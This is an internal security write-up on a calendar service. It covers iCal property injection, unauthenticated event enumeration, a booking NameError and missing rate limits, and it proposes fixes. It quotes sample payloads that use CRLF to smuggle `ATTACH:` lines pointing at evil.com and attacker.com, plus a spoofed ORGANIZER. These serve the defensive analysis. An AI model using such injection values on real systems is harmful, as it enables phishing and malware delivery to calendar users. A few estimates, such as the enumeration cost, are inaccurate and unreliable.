# SEC-023: iCal Injection + Public-Event Enumeration + Booking Abuse — Investigation & Implementation Write-up

> ~5 pages. Read the real code before writing; cite `file:line`. Be concrete, not generic.

## 1. Summary & Classification

Three distinct security issues share the calendar subsystem. First, the `_build_ics` helper at `app/routers/calendar.py:2048` builds RFC-5545 iCalendar files by interpolating untrusted user data into property lines without escaping, allowing an attacker to inject arbitrary iCal properties (e.g., `ATTACH:` pointing to malware, arbitrary `VALARM` triggers, or `ORGANIZER:` spoofing). Second, the public event API at `calendar.py:2079` returns full event data to anyone who can guess the `calendar_id` + `event_id` pair, with no authorization check and no rate limit, enabling unauthenticated enumeration of all calendar events. Third, the booking reservation endpoint at `calendar.py:1978` references an undefined `ctx` variable at line 2043, causing a runtime `NameError` / HTTP 500 on every successful reservation, making the booking feature completely non-functional and a potential DoS vector; additionally, booking endpoints have no rate limiting, allowing slot-spam and calendar flooding.

- **Type**: Security-fix
- **Priority/Severity**: High (injection + enumeration); Critical (reservation 500 — functional breakage)
- **Status**: Open
- **Owning area**: `app/routers/calendar.py`, specifically `_build_ics`, `get_public_event`, `download_public_ical`, `reserve_booking_slot`
- **Who is affected**: 🌐 any unauthenticated user (public enumeration); any user whose event name/description is rendered in an .ics file (injection victim); any user attempting to book a slot (500 error)
- **Cross-references**: **SECOPS-007** (dev/prod parity — DynamoDB Local vs prod DDB; same code path for all three issues). **SEC-008** (rate limiting uses the same IP-hashing pattern as moderation).

## 2. Current-State Investigation (what exists today)

### 2.1 iCal Property Injection — `_build_ics`

**`app/routers/calendar.py:2048-2074`**:

```python
def _build_ics(evt: dict, event_id: str) -> str:
    lines = [
        "BEGIN:VCALENDAR",
        ...
        "BEGIN:VEVENT",
        f"UID:{event_id}@testlogon",
    ]
    ...
    lines.append(f"SUMMARY:{evt.get('name', '')}")           # line 2070 — no escaping
    if evt.get("description"):
        lines.append(f"DESCRIPTION:{evt['description'].replace(chr(10), chr(92) + 'n')}")  # line 2072
    lines += ["END:VEVENT", "END:VCALENDAR"]
    return "\r\n".join(lines) + "\r\n"
```

**The issue**: RFC 5545 §3.3.11 requires that the characters `\`, `,`, `;`, and newline sequences (`\r\n`, `\r`, `\n`) in TEXT properties be escaped. The current code for `SUMMARY` does no escaping at all. The `DESCRIPTION` replacement converts `\n` to the backslash-n literal, but does **not** escape `\r` — so a CRLF sequence (`\r\n`) in `description` terminates the current property line and the next string is interpreted as a new iCal property.

**Concrete injection in SUMMARY**: An event named `Birthday Party\r\nATTACH:http://evil.com/malware.ics` produces:
```
SUMMARY:Birthday Party
ATTACH:http://evil.com/malware.ics
END:VEVENT
```

Calendar clients that import this `.ics` would present an attachment link pointing to attacker-controlled content, potentially triggering auto-download behavior.

**Injection via DESCRIPTION**: The current `replace(chr(10), chr(92) + 'n')` replaces `\n` with `\n` (the two-character sequence), but `\r` alone is not filtered. A description of `"Meeting notes\r\nORGANIZER:mailto:ceo@company.com"` renders as a spoofed `ORGANIZER` field after the CRLF line break.

**CSV/formula injection**: The event `name` is also used directly in the `Content-Disposition` filename at line 2104:
```python
safe = "".join(c for c in evt.get("name", "event") if c.isalnum() or c in " -_")[:40].strip()
```
The filename is sanitized, but the `SUMMARY` field in the iCal body is not. Excel and LibreOffice Calc can be configured to open `.ics` as CSV; leading `=`, `+`, `-`, `@` in SUMMARY triggers formula injection in those edge cases.

This same `_build_ics` is called by:
- `download_public_ical` (line 2098) — unauthenticated; any event in any calendar
- `download_event_ical` (line 2115) — authenticated; requires calendar access

### 2.2 Public Event Enumeration — `get_public_event` and `download_public_ical`

**`app/routers/calendar.py:2079-2109`**:

```python
@public_event_router.get("/event/{calendar_id}/{event_id}")
def get_public_event(calendar_id: str, event_id: str):
    evt = T.calendar.get_item(Key={"calendar_id": calendar_id, "sk": f"event#{event_id}"}).get("Item")
    if not evt:
        raise HTTPException(404, "Event not found")
    return {
        "event_id": ...,
        "name": evt.get("name"),
        "start_utc": evt.get("start_utc"),
        "end_utc": evt.get("end_utc"),
        "description": evt.get("description"),
    }
```

There is no authorization check: no session requirement, no `is_public` flag on the event, no shared token. Any caller who knows (or guesses) a `calendar_id` and `event_id` receives full event details — name, time, description — regardless of whether the owner intended the event to be public. Calendar IDs are UUIDs but event IDs are also UUIDs generated by `uuid.uuid4().hex` (line 2014), which are not secret if calendar IDs leak via another vector (e.g., a previously public booking link, analytics referrer, etc.).

There is no rate limiting on either endpoint. An attacker can enumerate all events in a calendar with approximately `O(2^32)` requests if event IDs are 32-character hex strings, but more practically, having a valid `calendar_id` allows enumeration of events in that calendar with a time-bounded scan. Booking link IDs (`link_id`) are also public and reveal `calendar_id` via `get_booking_link` (line 1946).

### 2.3 `NameError` in `reserve_booking_slot` — `ctx` Undefined

**`app/routers/calendar.py:1977-2043`**:

```python
@public_router.post("/{link_id}/reserve", response_model=EventOut)
async def reserve_booking_slot(link_id: str, body: BookingRequestIn):
    ...
    return _event_out(item, meta["calendar_id"], user_sub=ctx["user_sub"])   # line 2043
```

The function signature has no `ctx` parameter and no `Depends(require_ui_session)` or similar. `ctx` is undefined in this scope. Every call that reaches line 2043 (i.e., every successful reservation attempt) raises `NameError: name 'ctx' is not defined`, which FastAPI converts to HTTP 500. The booking feature is entirely broken for the `POST /{link_id}/reserve` endpoint.

**Secondary issue**: `_event_out` is called with `user_sub=ctx["user_sub"]` — because the endpoint is public (no auth), the correct value is `None` or an empty string to indicate an anonymous booker. Fixing the `NameError` by passing `user_sub=None` also aligns with the design intent.

### 2.4 No Rate Limiting on Booking Endpoints

`GET /booking/{link_id}` (line 1946) and `GET /booking/{link_id}/openings` (line 1960) and `POST /booking/{link_id}/reserve` (line 1977) have no rate-limiting decorators, no per-IP throttle, and no per-link slot-reservation guard beyond the conflict detection at line 2012. An unauthenticated attacker can:
- Spam `POST /reserve` with valid (non-conflicting) slots to flood a calendar with fake bookings.
- Call `GET /openings` at high frequency to enumerate available slots without triggering any alarm.

## 3. Gap / Threat Analysis

### Threat 1: Malicious iCal Attachment Delivery

**Scenario**: Attacker creates an event with `name = "Team Meeting\r\nATTACH:http://attacker.com/payload.ics"`. The attacker or a victim downloads the `.ics` from `/calendar/public/event/{id}/{eid}/ical`. Apple Calendar, Google Calendar (via import), and Outlook all parse `ATTACH:` properties; some clients auto-download `.ics` attachments. The victim's calendar application fetches and imports the attacker's payload, potentially adding arbitrary events including `VALARM` with `ACTION:AUDIO` or `ACTION:PROCEDURE` triggers.

**Impact**: Phishing, credential harvesting via spoofed event invites, calendar spam, client-side exploit delivery on vulnerable calendar clients.

**Blast radius**: Any user who imports or subscribes to a calendar from this platform; also affects the operator's reputation (platform used to distribute malicious calendars).

### Threat 2: Calendar Data Exfiltration via Unauthenticated API

**Scenario**: Attacker discovers a `calendar_id` via a public booking link URL embedded in a marketing email. They iterate over recently-created event IDs (UUIDs are time-ordered in some generation strategies) and retrieve event names, descriptions, and attendee fields for the calendar owner's entire schedule, including private appointments.

**Impact**: Privacy violation, stalking enablement, corporate intelligence gathering, GDPR/CCPA exposure (calendar entries may contain PII — attendee names, locations, medical appointments).

**Preconditions**: Knowledge of one valid `calendar_id` (low barrier via public booking links).

### Threat 3: Booking Endpoint DoS + Slot Exhaustion

**Scenario**: Attacker calls `POST /booking/{link_id}/reserve` in a loop with different future timestamps. Each call creates a real calendar event in the owner's calendar until the calendar is full of fake bookings. The slot conflict detection at line 2012 only prevents double-booking the *same* slot; different slots in the availability window are unprotected.

**Additional**: `POST /reserve` currently always raises HTTP 500 (NameError), so this is academic until the bug is fixed — but it also means the feature is completely unusable for legitimate customers.

## 4. Proposed Design / Fix

### 4.1 RFC-5545 Compliant Value Escaping

Add an `_escape_ics_text(value: str) -> str` function per RFC 5545 §3.3.11:

```python
def _escape_ics_text(value: str) -> str:
    """Escape TEXT property values per RFC 5545 §3.3.11."""
    # Escape backslash first, then special chars, then fold newlines
    value = value.replace("\\", "\\\\")
    value = value.replace(";", "\\;")
    value = value.replace(",", "\\,")
    # Replace all CRLF, CR, LF with the RFC-mandated \n escape sequence
    value = value.replace("\r\n", "\\n").replace("\r", "\\n").replace("\n", "\\n")
    return value
```

Apply to every user-controlled iCal property in `_build_ics`:

```python
lines.append(f"SUMMARY:{_escape_ics_text(evt.get('name', ''))}")
if evt.get("description"):
    lines.append(f"DESCRIPTION:{_escape_ics_text(evt['description'])}")
if evt.get("location"):
    lines.append(f"LOCATION:{_escape_ics_text(evt.get('location', ''))}")
```

Additionally apply line folding per RFC 5545 §3.1 (lines > 75 octets must be folded with CRLF + SPACE). A `_fold_ics_line(line: str) -> str` helper should be added and applied to each appended line.

### 4.2 Gate Public Event Access on an Explicit Share Flag

Add an `is_public` boolean field to calendar event items. Default `False` (opt-in, not opt-out). Gate `get_public_event` and `download_public_ical`:

```python
@public_event_router.get("/event/{calendar_id}/{event_id}")
def get_public_event(calendar_id: str, event_id: str):
    evt = T.calendar.get_item(Key={"calendar_id": calendar_id, "sk": f"event#{event_id}"}).get("Item")
    if not evt:
        raise HTTPException(404, "Event not found")
    if not evt.get("is_public", False):          # NEW: explicit public gate
        raise HTTPException(403, "Event is not publicly accessible")
    ...
```

Expose `is_public` as a field in `EventCreateIn` and `EventUpdateIn` models. Provide a UI control in the frontend event editor.

**Alternative — unguessable share tokens**: In addition to `is_public`, support share tokens (random 32-byte hex strings) stored on events. The public endpoints accept an optional `?token=...` query parameter; events not marked `is_public` can still be shared via token. This prevents enumeration even for public events because the token is required.

### 4.3 Add Rate Limiting to Public and Booking Endpoints

The project already has `app/services/rate_limit.py`. Add per-IP rate limiting to the unauthenticated public endpoints:

```python
from app.services.rate_limit import rate_limit_by_ip

@public_event_router.get("/event/{calendar_id}/{event_id}")
def get_public_event(calendar_id: str, event_id: str, request: Request):
    rate_limit_by_ip(request, action="public_event_get", max_count=60, window_seconds=60)
    ...
```

For booking endpoints:
```python
@public_router.post("/{link_id}/reserve")
async def reserve_booking_slot(link_id: str, body: BookingRequestIn, request: Request):
    rate_limit_by_ip(request, action="booking_reserve", max_count=5, window_seconds=60)
    rate_limit_by_link(link_id, action="booking_reserve", max_count=20, window_seconds=3600)
    ...
```

`rate_limit_by_link` is a new helper that tracks reservation attempts per `link_id` in DynamoDB (similar to the per-user pattern in moderation.py). This prevents slot exhaustion for any single booking link.

### 4.4 Fix `ctx` NameError in `reserve_booking_slot`

Remove the erroneous `ctx["user_sub"]` reference. Since the endpoint is public (no auth), pass `user_sub=None`:

```python
@public_router.post("/{link_id}/reserve", response_model=EventOut)
async def reserve_booking_slot(link_id: str, body: BookingRequestIn, request: Request):
    ...
    return _event_out(item, meta["calendar_id"], user_sub=None)   # line 2043 — fixed
```

Verify `_event_out` handles `user_sub=None` gracefully (it already accepts `Optional[str]` based on its signature).

### 4.5 Dev/Prod Parity (SECOPS-007)

- **iCal escaping**: Pure string transformation; identical in dev and prod.
- **`is_public` flag**: DynamoDB item attribute; dev uses DynamoDB Local. The `calendar` table definition in `scripts/local-ddb-init.py` does not need a new GSI for `is_public` (it's a filter attribute, not a sort key). No `attr_types` change needed.
- **Rate limiting**: Dev uses DynamoDB Local for rate-limit counters. `rate_limit_by_ip` already uses DynamoDB. No dev-mode bypass needed; in CI the counters are cleared between test runs because the DDB Local database is transient.
- **Share tokens**: Same DynamoDB pattern; UUIDs generated server-side.

### Rollout Order

1. **`ctx` NameError fix** (line 2043) — ship immediately; this is a functional blocker with no risk.
2. **iCal escaping** — ship immediately; purely additive, no schema changes.
3. **`is_public` flag + public endpoint gating** — requires frontend work (event editor toggle + UI label). Ship as a feature flag: default `is_public=False` for new events; existing events migrated to `is_public=True` on a per-calendar opt-in basis (or admin migration script).
4. **Rate limiting** — ship with (3); depends on `rate_limit_by_ip` and `rate_limit_by_link` helpers being implemented.

**Effort**: S (ctx fix + iCal escaping: <1 day); M (public flag + rate limiting: 2–3 days).

**Rollback**: All changes are additive or bug-fixes. The `is_public` flag has a safe default (`False`) — rolling back the migration would make previously-public events private again (conservative direction).

**Open questions**:
- Should existing public booking links implicitly grant `is_public=True` to all events in the linked calendar, or only to events created after the flag is enabled?
- Should the unguessable share-token mechanism be a v1 (replacing `is_public` entirely) or a v2 addition? The token approach eliminates the enumeration risk even if `calendar_id` + `event_id` pairs leak through other channels.
- What is the intended audience for public events — anonymous internet users (calendar subscription) or platform members only? This determines whether authentication should be required for the public endpoint even with a valid share token.
